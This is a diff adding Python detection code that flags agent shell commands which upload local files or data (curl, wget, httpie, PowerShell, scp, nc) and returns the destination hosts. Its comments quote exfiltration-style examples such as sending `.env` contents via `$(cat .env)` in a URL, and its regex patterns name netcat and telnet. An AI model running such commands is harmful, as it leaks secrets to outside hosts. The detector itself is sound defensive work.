@@ -507,6 +507,159 @@ def shell_sends_data(command: str, shell: str = "bash") -> bool:
     return any(_sends(argv) for argv in _parts(command or "", shell))
 
 
+# -- local data sent to a network host by a network client (round-2 F-5) -----------------
+# What counts is data FROM THE MACHINE: a file, stdin, a variable, a command's output.
+# Text the agent typed into the command (`-d grant_type=client_credentials`) is not local
+# data, and a POST method alone sends nothing of the machine's: both stay with the reviewer.
+# curl flags whose value is a request body; the upload flags always send a file (or `-`).
+_CURL_BODY_FLAGS = {
+    "-d", "--data", "--data-binary", "--data-raw", "--data-ascii", "--data-urlencode",
+    "-F", "--form", "--form-string", "--json", "-T", "--upload-file",
+}
+_CURL_UPLOAD_FLAGS = {"-T", "--upload-file"}
+_CURL_FORM_FLAGS = {"-F", "--form"}
+_WGET_FILE_FLAGS = {"--post-file", "--body-file"}
+_WGET_DATA_FLAGS = {"--post-data", "--body-data"}
+_HTTPIE = {"http", "https", "httpie"}
+_PS_WEB = {"invoke-webrequest", "iwr", "invoke-restmethod", "irm"}
+# PowerShell: `-Body $text`, `-Body (Get-Content notes.txt)`, `-Form @{f = Get-Item x}`.
+_PS_LOCAL_BODY = re.compile(r"-(?:body|form)\s+[\"']?[($@]", re.IGNORECASE)
+# stdin piped into a client that sends it as the body (httpie does so by itself).
+_PIPED_INTO_HTTPIE = re.compile(r"\|\s*(?:\S*[\\/])?(?:http|https|httpie)\b", re.IGNORECASE)
+# Raw sockets send whatever is piped or redirected into them.
+_RAW_SOCKET = re.compile(
+    r"\|\s*(?:\S*[\\/])?(?:nc|ncat|netcat|telnet)(?:\.exe)?\b"
+    r"|\b(?:nc|ncat|netcat|telnet)(?:\.exe)?\b[^|;&]*<",
+    re.IGNORECASE,
+)
+# A URL written without its scheme (`backup.example/upload`), as curl and httpie accept.
+_BARE_HOST = re.compile(
+    r"^((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})(?::\d+)?(?:/|$)", re.IGNORECASE
+)
+_FILE_EXTENSIONS = _FILE_LIKE_TLDS | {
+    "txt", "json", "csv", "log", "xml", "yaml", "yml", "toml", "ini", "cfg", "conf",
+    "html", "htm", "pdf", "png", "jpg", "jpeg", "gif", "gz", "tgz", "tar", "bz2", "xz",
+    "7z", "db", "sqlite", "bin", "dat", "key", "pem", "env", "js", "ts", "go", "java",
+}
+# An httpie item that sends a file: `@file`, `field@file`, `field=@file`, `field:=@file`.
+_HTTPIE_FILE_ITEM = re.compile(r"^(?:[^=:@/\s]+(?:=|:=)?)?@")
+
+
+def _expands(value: str) -> bool:
+    """A variable or a command's output: data from the machine, not typed text."""
+    return "$" in value or "`" in value
+
+
+def _flag_values(argv: list[str], flags: set[str]) -> list[tuple[str, str]]:
+    """(flag, value) for each of `flags` on the line: `-d x`, `--data=x`, curl's glued
+    short form `-d@x`."""
+    out = []
+    for i, token in enumerate(argv[1:], start=1):
+        name, eq, value = token.partition("=")
+        if token.startswith("--") and eq and name in flags:
+            out.append((name, value))
+        elif token in flags:
+            out.append((token, argv[i + 1] if i + 1 < len(argv) else ""))
+        elif not token.startswith("--") and len(token) > 2 and token[:2] in flags:
+            out.append((token[:2], token[2:]))
+    return out
+
+
+def _curl_sends_local(argv: list[str]) -> bool:
+    for flag, value in _flag_values(argv, _CURL_BODY_FLAGS):
+        if flag in _CURL_UPLOAD_FLAGS or value.startswith("@") or _expands(value):
+            return True
+        if flag in _CURL_FORM_FLAGS and ("=@" in value or "=<" in value):
+            return True  # -F file=@notes.txt, -F text=<notes.txt
+        if flag == "--data-urlencode" and "@" in value:
+            return True  # name@file
+    return False
+
+
+def _client_sends(argv: list[str], shell: str, text: str) -> bool:
+    """Whether this network-client command line sends local files or data out."""
+    program = _program(argv)
+    if any("$(" in t or "`" in t for t in argv[1:]):
+        return True  # `curl https://x/?d=$(cat .env)`: a command's output rides along
+    if program == "curl":
+        return _curl_sends_local(argv)
+    if program == "wget":
+        return bool(_flag_values(argv, _WGET_FILE_FLAGS)) or any(
+            _expands(v) for _f, v in _flag_values(argv, _WGET_DATA_FLAGS)
+        )
+    if program in _HTTPIE:
+        items = [t for t in argv[1:] if not t.startswith("-") and "://" not in t]
+        return bool(_PIPED_INTO_HTTPIE.search(text)) or any(
+            _HTTPIE_FILE_ITEM.match(t) or (("=" in t or "@" in t) and _expands(t)) for t in items
+        )
+    if program in _PS_WEB:
+        lowered = [t.lower() for t in argv[1:]]
+        return "-infile" in lowered or bool(_PS_LOCAL_BODY.search(text))
+    if program in _COPY_PROGRAMS:
+        return any(_REMOTE_ARG.match(t) and not _DRIVE.match(t) for t in argv[1:]) and bool(
+            sent_files("run_shell", {"command": " ".join(argv)}, shell)
+        )
+    return False
+
+
+def _client_hosts(argv: list[str]) -> list[str]:
+    """The destination hosts written on one network-client command line: the URLs' hosts;
+    for scp / rsync / sftp the `host` of `user@host:path`; failing both, a URL written
+    without its scheme. `notes.txt` is a file, not a host: a scheme-less name counts only
+    when a path or port follows it or its ending is not a common file extension."""
+    hosts = [m.group(1) for t in argv[1:] for m in _URL_HOST.finditer(t)]
+    if _program(argv) in _COPY_PROGRAMS:
+        hosts += [
+            t.split(":", 1)[0].rsplit("@", 1)[-1]
+            for t in argv[1:]
+            if "://" not in t and _REMOTE_ARG.match(t) and not _DRIVE.match(t)
+        ]
+        return hosts
+    if hosts:
+        return hosts
+    for token in argv[1:]:
+        bare = None if token.startswith(("-", "@")) else _BARE_HOST.match(token)
+        if not bare:
+            continue
+        host = bare.group(1)
+        if len(token) > len(host) or host.rsplit(".", 1)[-1].lower() not in _FILE_EXTENSIONS:
+            hosts.append(host)
+    return hosts
+
+
+def shell_upload_hosts(command: str, shell: str = "bash") -> Optional[list[str]]:
+    """Where a shell command sends LOCAL files or data with a network client, or None when
+    it sends none (round-2 F-5).
+
+    Sending local data is: a file as the body or an upload (`--data-binary @notes.txt`,
+    `-F f=@x`, `-T x`, `--post-file`, `-InFile`, httpie's `f@x`); stdin as the body
+    (`@-`, a pipe into httpie); a variable or a command's output anywhere in a network
+    client's arguments (`-d "$(cat x)"`, `?d=$(cat .env)`, `-Body $text`); an scp / rsync /
+    sftp copy to a remote; data piped or redirected into nc, ncat, netcat or telnet.
+    Typed text (`-d grant_type=client_credentials`) and a bare `-X POST` are not.
+
+    The list holds the destination hosts as written, lower-cased. An empty string in it
+    means a destination that could not be read (a raw socket; a client with no URL), and
+    callers treat that as a host nobody granted. Publishing programs (`git push`,
+    `npm publish`, cloud copies) are not covered: they go to a configured remote or
+    registry and keep their own handling (`shell_sends_data`, the secret floor). This reads
+    the command TEXT and is best effort, like the rest of this module."""
+    text = command or ""
+    hosts: list[str] = []
+    sends = False
+    for argv in _parts(text, shell):
+        if Path(argv[0]).name.lower() not in _NETWORK_CLIENTS and _program(argv) not in _NETWORK_CLIENTS:
+            continue
+        if not _client_sends(argv, shell, text):
+            continue
+        sends = True
+        hosts.extend(_client_hosts(argv) or [""])
+    if _RAW_SOCKET.search(text):
+        sends = True
+        hosts.append("")  # nc takes host and port positionally; not read
+    return [h.lower() for h in hosts] if sends else None
+
+
 # -- point 4b: what `git push` would send, what `git add -A` would stage --------------------
 _PUSH_CONTENT_FILES = 100  # blobs read per push check; names are checked for every file
 
